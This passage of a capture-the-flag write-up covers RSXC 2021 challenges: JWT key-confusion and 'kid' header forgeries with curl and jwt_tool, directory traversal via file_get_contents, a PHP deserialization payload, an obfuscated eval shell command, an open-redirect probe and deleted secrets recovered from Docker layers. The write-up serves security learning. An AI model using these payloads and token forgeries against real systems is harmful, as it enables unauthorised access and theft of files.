        sleep(0.1)
        response = s.recv(1024).decode('utf-8')
        for line in response.splitlines():
            print('Server:', line)
            if m := re.match(r"Can you please hex decode this for me: (.*)", line):
                answer = bytes.fromhex(m.group(1))
            elif m := re.match(r"Please turn this to lower case for me: (.*)", line):
                answer = m.group(1).lower().encode()
            elif m := re.match(r"Please base64 decode this for me: (.*)", line):
                answer = base64.b64decode(m.group(1))
            elif m := re.match(r"Please reverse this string for me: (.*)", line):
                answer = m.group(1)[::-1].encode()
            elif re.match(r"RSXC{.*}", line): # RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}
                done = True
                continue
            else:
                continue
            s.send(answer)
            print('Client:', answer.decode("utf-8"), '\n')
```

Here's the conversation the script had with the server:
```
Server: Good luck, you have 12 seconds to solve these 100 tasks!
Server: Please turn this to lower case for me: DKWLEWWW
Client: dkwlewww 

Server: Please reverse this string for me: bSJslfNQe
Client: eQNflsJSb 

Server: Please reverse this string for me: LTBXkZf
Client: fZkXBTL 

Server: Can you please hex decode this for me: 4858694659636c75
Client: HXiFYclu 

Server: Please reverse this string for me: mtoLBlkz
Client: zklBLotm 

Server: Please base64 decode this for me: ZGtUTXJqSmhNeks=
Client: dkTMrjJhMzK 

Server: Please base64 decode this for me: bGxYa0ZGSQ==
Client: llXkFFI 

Server: Can you please hex decode this for me: 674e4e4e42735a704c4d
Client: gNNNBsZpLM 

Server: Please turn this to lower case for me: BSTZKQGGIU
Client: bstzkqggiu 

Server: Please turn this to lower case for me: MPHTXSG
Client: mphtxsg 

Server: Please reverse this string for me: CpnOIek
Client: keIOnpC 

Server: Please reverse this string for me: TzJsGl
Client: lGsJzT 

Server: Please reverse this string for me: YKLAFhu
Client: uhFALKY 

Server: Can you please hex decode this for me: 66695a4a4b714d79
Client: fiZJKqMy 

Server: Can you please hex decode this for me: 504c6f424c726c
Client: PLoBLrl 

Server: Please turn this to lower case for me: STECNHGYZ
Client: stecnhgyz 

Server: Can you please hex decode this for me: 6b61444f597a754c5559
Client: kaDOYzuLUY 

Server: Please reverse this string for me: BflmlVh
Client: hVlmlfB 

Server: Please reverse this string for me: dYDLRtFac
Client: caFtRLDYd 

Server: Please base64 decode this for me: Z25JS3JpSw==
Client: gnIKriK 

Server: Please base64 decode this for me: U25uaVh0ZGxT
Client: SnniXtdlS 

Server: Please base64 decode this for me: QnFBREtkRXY=
Client: BqADKdEv 

Server: Can you please hex decode this for me: 57725a50697143794c456e
Client: WrZPiqCyLEn 

Server: Please turn this to lower case for me: PNVMFJYRO
Client: pnvmfjyro 

Server: Please reverse this string for me: taafkjJ
Client: Jjkfaat 

Server: Please base64 decode this for me: V1JQd1Vz
Client: WRPwUs 

Server: Please base64 decode this for me: RXdDTlNwZlJ1TkU=
Client: EwCNSpfRuNE 

Server: Please turn this to lower case for me: SIWYLCSSD
Client: siwylcssd 

Server: Can you please hex decode this for me: 6b6f566a5555
Client: koVjUU 

Server: Please reverse this string for me: hiiquVsESqH
Client: HqSEsVuqiih 

Server: Can you please hex decode this for me: 664c586b71546c4a53
Client: fLXkqTlJS 

Server: Please turn this to lower case for me: LEMNPINKD
Client: lemnpinkd 

Server: Please base64 decode this for me: UmNrUGhCdmI=
Client: RckPhBvb 

Server: Please turn this to lower case for me: PRACFXNPY
Client: pracfxnpy 

Server: Can you please hex decode this for me: 6a72756a4377495a55
Client: jrujCwIZU 

Server: Please base64 decode this for me: QVFvZURzQ0U=
Client: AQoeDsCE 

Server: Please turn this to lower case for me: PLUJJXGC
Client: plujjxgc 

Server: Please turn this to lower case for me: JNHZAKQYD
Client: jnhzakqyd 

Server: Please base64 decode this for me: Y3VJSFVVUnFt
Client: cuIHUURqm 

Server: Can you please hex decode this for me: 735075726744
Client: sPurgD 

Server: Please base64 decode this for me: c3Jhckx1aWt3cVY=
Client: srarLuikwqV 

Server: Can you please hex decode this for me: 677063664243734f58764c
Client: gpcfBCsOXvL 

Server: Can you please hex decode this for me: 777253597348586f
Client: wrSYsHXo 

Server: Can you please hex decode this for me: 7a46564e524b54774d5047
Client: zFVNRKTwMPG 

Server: Please reverse this string for me: SXdhmDpp
Client: ppDmhdXS 

Server: Can you please hex decode this for me: 504d746f4b4751416a4f
Client: PMtoKGQAjO 

Server: Please reverse this string for me: JjFOMH
Client: HMOFjJ 

Server: Please reverse this string for me: NLMFvF
Client: FvFMLN 

Server: Please turn this to lower case for me: RPTQDCEDKZ
Client: rptqdcedkz 

Server: Please base64 decode this for me: RlBORnNQRURa
Client: FPNFsPEDZ 

Server: Can you please hex decode this for me: 534d6e616777676e4f4c
Client: SMnagwgnOL 

Server: Please base64 decode this for me: WExpYUFKYw==
Client: XLiaAJc 

Server: Can you please hex decode this for me: 58534758454d645658
Client: XSGXEMdVX 

Server: Please turn this to lower case for me: XFBWYWBE
Client: xfbwywbe 

Server: Can you please hex decode this for me: 534f4e5a726149
Client: SONZraI 

Server: Can you please hex decode this for me: 474841634b6c61
Client: GHAcKla 

Server: Please turn this to lower case for me: XNNVWNWVZL
Client: xnnvwnwvzl 

Server: Can you please hex decode this for me: 5469454e7049715746
Client: TiENpIqWF 

Server: Please turn this to lower case for me: ETTYHHZAO
Client: ettyhhzao 

Server: Can you please hex decode this for me: 69784c53425178586b6c73
Client: ixLSBQxXkls 

Server: Can you please hex decode this for me: 6a46644f47696c5a
Client: jFdOGilZ 

Server: Please reverse this string for me: UeKlUVPEqi
Client: iqEPVUlKeU 

Server: Please reverse this string for me: dMsTrKjKyx
Client: xyKjKrTsMd 

Server: Can you please hex decode this for me: 6b4a4470524c7548
Client: kJDpRLuH 

Server: Please base64 decode this for me: VnRqYnN5S0h3Zg==
Client: VtjbsyKHwf 

Server: Please turn this to lower case for me: KCOJHYDGW
Client: kcojhydgw 

Server: Please base64 decode this for me: emNxbUZYb1Vj
Client: zcqmFXoUc 

Server: Please turn this to lower case for me: NUAXJXBNFZC
Client: nuaxjxbnfzc 

Server: Please turn this to lower case for me: IGXGOKYFQT
Client: igxgokyfqt 

Server: Please turn this to lower case for me: FIPIPSSFICA
Client: fipipssfica 

Server: Can you please hex decode this for me: 596f475878724e645a466a
Client: YoGXxrNdZFj 

Server: Please base64 decode this for me: VktXUk9z
Client: VKWROs 

Server: Please base64 decode this for me: SXlucmZ5UWxI
Client: IynrfyQlH 

Server: Can you please hex decode this for me: 616c4c684c44
Client: alLhLD 

Server: Can you please hex decode this for me: 716d5375506a7973
Client: qmSuPjys 

Server: Please turn this to lower case for me: QSXOMJ
Client: qsxomj 

Server: Please base64 decode this for me: Znd4dEZmWFE=
Client: fwxtFfXQ 

Server: Please turn this to lower case for me: YZFRCBYWPI
Client: yzfrcbywpi 

Server: Can you please hex decode this for me: 4c736d59584f794d4d5566
Client: LsmYXOyMMUf 

Server: Please base64 decode this for me: c2FocXB2RUFtUQ==
Client: sahqpvEAmQ 

Server: Can you please hex decode this for me: 42647446626a5670
Client: BdtFbjVp 

Server: Please base64 decode this for me: Qlh1VERSWm1FcA==
Client: BXuTDRZmEp 

Server: Please reverse this string for me: YPVqGl
Client: lGqVPY 

Server: Please turn this to lower case for me: YVSAKXOJKD
Client: yvsakxojkd 

Server: Please reverse this string for me: uToDly
Client: ylDoTu 

Server: Can you please hex decode this for me: 787952785655
Client: xyRxVU 

Server: Please reverse this string for me: oSzWph
Client: hpWzSo 

Server: Please turn this to lower case for me: JTYCAGVAXBW
Client: jtycagvaxbw 

Server: Please turn this to lower case for me: GJBAOEOKA
Client: gjbaoeoka 

Server: Please reverse this string for me: UBCjzHudyvG
Client: GvyduHzjCBU 

Server: Please base64 decode this for me: dU1maEVWdUlz
Client: uMfhEVuIs 

Server: Please turn this to lower case for me: LHSWYAUES
Client: lhswyaues 

Server: Please turn this to lower case for me: QYCQOBPJHHG
Client: qycqobpjhhg 

Server: Please reverse this string for me: SjNppip
Client: pippNjS 

Server: Can you please hex decode this for me: 5248624a6c654544
Client: RHbJleED 

Server: Please reverse this string for me: XkysXg
Client: gXsykX 

Server: Please base64 decode this for me: R0FQV0hZQU8=
Client: GAPWHYAO 

Server: Please turn this to lower case for me: NMECWB
Client: nmecwb 

Server: Can you please hex decode this for me: 6d7777774a535a59
Client: mwwwJSZY 

Server: Please turn this to lower case for me: JSPEAJ
Client: jspeaj 

Server: Can you please hex decode this for me: 4c43704964456847
Client: LCpIdEhG 

Server: RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}
```

### Flag
**The flag was `RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}`**.  
   
   
   
## 13 - New technology is hard
### Challenge
> When starting with new languages and frameworks, it is easy to get confused, and do things you shouldn't.
> 
> http://rsxc.no:20013

### Tools used
 - [Vivaldi developer tools](https://help.vivaldi.com/desktop/tools/developer-tools/)

### Solution
The web application linked to was a [React](https://en.wikipedia.org/wiki/React_(JavaScript_library)) application. This challenge was unfortunately very relevant for modern web applications. Way too often developers don't have deep enough knowledge of how their frameworks work or how the technology works one level down from where they are using it. This sometimes lead to secrets being spilt.

All that was necessary to find the flag was to brows the code a bit:

![image](https://user-images.githubusercontent.com/832005/145781383-56e9d296-3a29-4c15-9ae3-7bd6b61622ed.png)
```js
> atob('UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0=')
< "RSXC{it_might_be_there_even_if_you_don't_include_it!}"
```

### Flag
**The flag was `RSXC{it_might_be_there_even_if_you_don't_include_it!}`**.  
   
   
   
## 14 - JWT
### Challenge
> Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
> 
> http://rsxc.no:20014

### Input
[jwtRS256.key.pub](./files/jwtRS256.key.pub):
```
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2HCuADTkFYneLWgEL92i
CIh0GffCPsRITE6Ay0nNofUT3ilU2HebW7Q3C1nrasFiDGI3dIK/NQ55nJJ49dln
9A/RItOzq9R3BYwc4QtarZcf4WO1fSADJ/n5bhHD1AIX3i3przZGdX4maj0DX/HW
cK9hfiPZPFHsF9Wcm8ocnNL18f7U+POJcJ6j2h45+mXd8HoYwahdrKSoUJLHeteO
Dy7/0dfh17INZnoiMzwKIz15vg/IPbSMQFpbOUy57Z+n3/P9Fi7VISxl6sgwdkdr
H6O7XU/5w7e+0Inc7Rlc7vytq8oR85ID9ZFM7AnuObTKRfJr3cV4dVtmn0nXdNU1
CQ5fmT+7TE49ftSqQAl5SkDfJ8NjOXrMNyuZ8FIDl3cealXhkZrdHnA3yw7lkOKf
ZASA+Yj9/TeVeHPMvl39yhp14k9FhmQlWUUS2pIxPu2gDfg5GSkdOFF3mbsqtUnf
hl7BQhePZyT0X0WFkxqLy0ojUGy5+VKwoiv6QOH7o9hF1MdIlFijpJ+yF/bOwgY0
qS5j/+IELbLAI4d5767nzod/aPOzuTb9e15wmLRX/n9W8tIEx7zfYXUNkD/db6yR
iTivIoTpNAtk8GaO1H3FHwBPfk16xrx9gePix9EuE2mDmOBolHKeEmf/FiDPy8Pj
tVenqelEd8DrEdL7v5IgBE0CAwEAAQ==
-----END PUBLIC KEY-----
```

### Tools used
 - [The JSON Web Token Toolkit v2](https://github.com/ticarpi/jwt_tool)


### Solution
This one was a bit tricker than I expected it to be. We are told that there's a login `test` / `test` for the web site and that the administrator username is `admin`.

When one logged in one got back [JSON Web Token (JWT)](https://en.wikipedia.org/wiki/JSON_Web_Token) cookie which had the following (here decoded) header and payload:
```js
{"typ":"JWT","alg":"RS256"}.{"username":"test"}
```

When logged in the site linked to the public key `jwtRS256.key.pub` for the JWT. At first I thought maybe it was enough to change the `username` to `admin` and that the server wouldn't check the signature, but that didn't work. The same with changing the algorithm (`alg`) to `none` or just removing the signature all together.

I had to turn to a neat tool called [The JSON Web Token Toolkit v2](https://github.com/ticarpi/jwt_tool). Running that gave the results I was looking for:

```sh
python3 jwt_tool.py -t http://rsxc.no:20014/portal.php -rc "PHPSESSID=[valid session id]; jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME" \
--verbose \
--canaryvalue "notes" \
--mode pb \
--pubkey ../../files/jwtRS256.key.pub

# [...]

File loaded: ../../files/jwtRS256.key.pub
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.DFCif6k8et5YtuZThSkXxjlwPfbioF4Zi-ZWPdtqVMo
[+] FOUND "notes" in response:
jwttool_d8da5b0f180b63e5f1074f75564c8287 Exploit: RSA Key Confusion Exploit (provided Public Key) Response Code: 200, 802 bytes
```

So the challenge text really meant it when it said that JWTs can be a bit confusing. What the tool calls _RSA Key Confusion Exploit_ is the vulnerability [CVE-2016-10555](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10555) where the JWT algorithm isn't enforced and one can use [HMAC](https://en.wikipedia.org/wiki/HMAC) with SHA-256 (HS256) and the public key to sign the message. On the server side the JWT library will verify that indeed the token is valid as per `HS256` with the public key now incorrectly used as a shared secret.

I tweaked the Python toolkit to use `username: admin` and print out the token so I could fetch the flag for myself:

```sh
curl 'http://rsxc.no:20014/portal.php' \
-H 'Cookie: PHPSESSID=[valid session id]; jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0=.ppHfEhCJo8O870AHZMOD8Q6WQXZMOGaDjuJ4jifYfeA' \
-i \
-sS | grep RSXC

          <p>The flag is RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}</p>
```

The (decoded variant) of the token's header and payload now was this:
```js
{"typ":"JWT","alg":"HS256"}.{"username":"admin"}
```

### Flag
**The flag was `RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}`**.  
   
   
   
## 15 - JWT 2
### Challenge
> I can admit I might not have figured out everything, but I think everything should be figured out now! I have however implemented a new header I found in RFC 7515.
> 
> http://rsxc.no:20015

### Input
 - [jwtRS256.key.pub](./files/jwtRS256.key.pub) from the day before

### Tools used
 - [jwt.io](https://jwt.io)
 - [ngrok](https://ngrok.com)
 - [Python](https://python.org)

### Solution
The site was pretty much the same as the day before - with the same logins and using [JWT](https://en.wikipedia.org/wiki/JSON_Web_Token) for authentication. When one logged in the server sent back a JWT cookie which had the following (here decoded) header and payload:
```js
{"typ": "JWT", "alg": "RS256", "kid": "http://localhost/jwtRS256.key.pub"}.{"username": "test"}
```

It was pretty obvious that `kid` was the key here. This was the _"new header I found in [RFC 7515](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.4)"_. That header parameter was a hint indicating which specific key owned by the signer should be used to validate the signature. The URL pointed to the server location where the public key was. Could it be that one could provide a different URL in the JWT? 💡

#### Alternative 1 - Remote certificate inclusion
First I got a random private and public key pair from the Internet and pasted them + header and payload at [jwt.io](https://jwt.io) (don't try that at home with production stuff, kids). The username in the payload was changed to `admin`. I fired up a Python web server for the public key using `python -m http.server 8080` and used [ngrok](https://ngrok.com) to get a path back in using `ngrok http 8080`. I then changed the JWT at jwt.io to the ngrok URL for the public key. Finally I used the new JWT when accessing the website, and what do you know, the server called back and was more than happy to let me in to see the flag.

```sh
curl 'http://rsxc.no:20015/portal.php' \
  -H 'Cookie: PHPSESSID=[valid session id]; jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.WHG0sFQTZARUPwqOv5QSShxb8CzqX_qRYuDsMhPbV7It3gGsMk3Bt88_jvO_VpgEWuEGkMlHHw22e4ei4x_m-QMTteViBnU9PagsdSRlZNhh3nnO7N2zP5-KUZYR4aWzI0z4TGYOwTHfQsxOdoECESSbtqA99qLfeSsRUsekK3gpxTkeZa_HEVIchCEzr07BHhd29bfqgYwzR4LxeQN0LGXmZ2K7GKrwoBUImJ-G849ybeIB17CXiZEZDv7ssd-BA3m8YGU0I7Ov8jP9nF6BmPYBuzoS3HGSePfbVCQosEIE2RheYAgoE6fXSUs25LjnCKiiP7flFDcMUurvytkfvw' \
  -i \
  -sS | grep RSXC

          <p>The flag is RSXC{Don't_let_others_decide_where_your_keys_are_located}</p>
```

#### Alternative 2 - Directory traversal attack  🐱‍💻
I accidentally served the wrong file once and to my surprise I saw the server had another - seemingly not intentional - security vulnerability; a [directory traversal attack](https://en.wikipedia.org/wiki/Directory_traversal_attack). When I remotely served the wrong file it showed the contents of that file and a PHP error message.

It turned out that the PHP script use the infamous [`file_get_contents`](https://www.php.net/manual/en/function.file-get-contents.php) which loads remote as well as local files into a string, and which has been a source of countless security issues. When I changed it to a local file like `index.php` it showed the contents of that. Even without breaking [the rules](https://rsxc.no/rules.php) one then could use `{"kid": "portal.php"}` to get flag:

```sh
curl 'http://rsxc.no:20015/portal.php' \
  -H 'Cookie: PHPSESSID=[valid session id]; jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.WHG0sFQTZARUPwqOv5QSShxb8CzqX_qRYuDsMhPbV7It3gGsMk3Bt88_jvO_VpgEWuEGkMlHHw22e4ei4x_m-QMTteViBnU9PagsdSRlZNhh3nnO7N2zP5-KUZYR4aWzI0z4TGYOwTHfQsxOdoECESSbtqA99qLfeSsRUsekK3gpxTkeZa_HEVIchCEzr07BHhd29bfqgYwzR4LxeQN0LGXmZ2K7GKrwoBUImJ-G849ybeIB17CXiZEZDv7ssd-BA3m8YGU0I7Ov8jP9nF6BmPYBuzoS3HGSePfbVCQosEIE2RheYAgoE6fXSUs25LjnCKiiP7flFDcMUurvytkfvw' \
  -i \
  -sS | grep RSXC

$flag = "RSXC{Don't_let_others_decide_where_your_keys_are_located}"
```

### Flag
**The flag was `RSXC{Don't_let_others_decide_where_your_keys_are_located}`**.  
   
   
   
## 16 - A scary command
### Challenge
> Sometimes while monitoring networks and machines, or doing incident response, we find some obfuscated commands. We didn't have time to deobfuscate this, and it is not recommended to just run it. Could you help us with it?
> 
> https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh

### Input
[`16-challenge.sh`](./files/16-challenge.sh):
```
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '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
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

### Tools used
 - Text editor
 - Unix shell

### Solution
It's of course potentially dangerous to run unknown code like this. I deobfuscated the code in a "burner machine" (a throw-away virtual image). Even though I knew the calendar shouldn't be harmful I couldn't tell for sure that the code hadn't been replaced by some bad actor.

I manually changed the evil `eval` and `sh` expressions to `echo` and took it one step at the time. Luckily there weren't that many layers of obfuscation. At the last step there was a `curl` call to a non-existing flag at `http://rsxc.no/b60b34d2afcd4b3950e4c6341efbc10cdb70e782c70b2bf8950e305ad90ebd5f/flag.txt` + a Base64 encoded string which was hiding the actual flag.

#### Bonus: Open redirection vulnerability
While looking for the flag I noticed that the call for the flag revealed a [open redirection vulnerability](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) at the server hosting the calendar. When redirecting from `http` to `https` the server didn't prefix the server path with `/`. This was fixed immediately when I notified River Security about it.

```
$ curl -I http://rsxc.no/evilsite.or.riversecurity.eu

HTTP/1.1 301 Moved Permanently
Date: Thu, 16 Dec 2021 03:13:37 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Location: https://rsxc.noevilsite.or.riversecurity.eu
Content-Type: text/html; charset=iso-8859-1
```


### Flag
**The flag was `RSXC{Don't_blindly_trust_obfuscated_code_it_might_do_something_bad}`**.  
   
   
   
## 17 - My XMas card
### Challenge
> We felt like it's time to start sending out some XMas cards, maybe you find something you like?
> 
> http://rsxc.no:20017

### Tools used
 - [W3School's PHP Tryit Editor](https://www.w3schools.com/Php/phptryit.asp?filename=tryphp_compiler)

### Solution
The screenshot below sums up the challenge pretty good. There was a PHP script displaying the Christmas card in `/files`. The same directory had the flag to which visitors don't have access to. Luckily for us, as the attacker, the developer had made a classical fault and revealed the source code through a copy of the `index.php` file with a file ending that the app server serves as text.

![image](https://user-images.githubusercontent.com/832005/146637463-02483e54-35c3-452d-9e4a-daedb3d71e87.png)

Looking at the source code one could see that there's a way of serving a different `Card` class through a Base64 encoded serialized version of it. A pretty dangerous exercise of the developer.

I don't know the PHP serialization syntax by hand so I used the first online PHP editor I found and made this code:
```php
<?php
class Card{
	public $file = "flag.txt";
}

$serialized = serialize(new Card());
$encoded = base64_encode($serialized);

echo("$serialized<br/>$encoded");
?>
````

That gave this output:
```
O:4:"Card":1:{s:4:"file";s:8:"flag.txt";}
Tzo0OiJDYXJkIjoxOntzOjQ6ImZpbGUiO3M6ODoiZmxhZy50eHQiO30=
````

Going to `?card=Tzo0OiJDYXJkIjoxOntzOjQ6ImZpbGUiO3M6ODoiZmxhZy50eHQiO30=` revealed the flag.


#### Bonus: Accessing `.htaccess`
The same vulnerability that got the flag can be used to access [`.htaccess`](https://httpd.apache.org/docs/2.4/howto/htaccess.html) using the payload `O:4:"Card":1:{s:4:"file";s:9:".htaccess";}`:
```
DirectoryIndex index.html

<Files "flag.txt">
    Order allow,deny
    #Deny from all
    Require all granted
</Files>
```

### Flag
**The flag was `RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}`**.  
   
   
   
## 18 - Remember the flag? Docker remembers
### Challenge
> We found a docker image, but it seems that the flag has been removed from it, could you help us get it back?
> 
> https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip

### Input
 - [18-challenge.zip](./files/18-challenge.zip)

### Tools used
 - File archiver

### Solution
First I took a look at what we had got:
```sh
$ unzip 18-challenge.zip -d 18-challenge
Archive:  18-challenge.zip
  inflating: 18-challenge/Dockerfile  
  inflating: 18-challenge/docker-box.tar.gz  

$ cd 18-challenge
$ cat Dockerfile 
FROM alpine:3.14
COPY ./flag.txt /flag.txt
RUN rm /flag.txt
```

The ZIP file contained a [Docker](https://en.wikipedia.org/wiki/Docker_(software)) container with its belonging [Dockerfile](https://docs.docker.com/engine/reference/builder/).

The container is first initialized from a base image (seemingly [Alpine Linux](https://en.wikipedia.org/wiki/Alpine_Linux)). Then the flag is copied into the container before it's deleted.

A quick way of getting that flag from that stage (at least without having Docker installed) was to just decompress the container archive and search for the flag format:

```sh
$ tar xzvf docker-box.tar.gz
x docker-box.tar

$ strings docker-box.tar | grep RSXC
RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}
```

Why was the flag available even though it was deleted? The Dockerfile `RUN` instruction will execute any commands in a new layer on top of the current image and commit the results. All the layers are stored. They become a sort of a `diff` between the different stages. Now, one shouldn't include secrets in the containers at all, but for this scenario building the image with the `--squash` flag probably would have avoided the issue.

### Flag
**The flag was `RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}`**.  
   
   
   
## 19 - The inclusive xmas cards
### Challenge
> We felt that the our last xmas cards weren't that inclusive. So we made even more options, so everyone has one that fits them!
> 
> http://rsxc.no:20019

### Tools used
- [Vivaldi developer tools](https://help.vivaldi.com/desktop/tools/developer-tools/)

### Solution
This time there were 3 Christmas cards, and the links to them looked a lot like they had Base64 encoded values:
`http://rsxc.no:20019/card.php?card=c2FudGEudHh0 => santa.txt`

This one could be solved quickly and directly in the console of the web browser:
![image](https://user-images.githubusercontent.com/832005/146671381-f017ac14-8eba-434c-85c6-29c207d9f495.png)

```js
> document.querySelectorAll('a').forEach((a)=>console.log(atob(a.href.substr(a.href.indexOf('=') + 1))));
santa.txt
snowmen.txt
tree.txt

> document.location='card.php?card=' + btoa('flag.txt');
```

Going to `http://rsxc.no:20019/card.php?card=ZmxhZy50eHQ=` (`flag.txt`) gave the flag.

#### Bonus: Accessing `.htaccess`
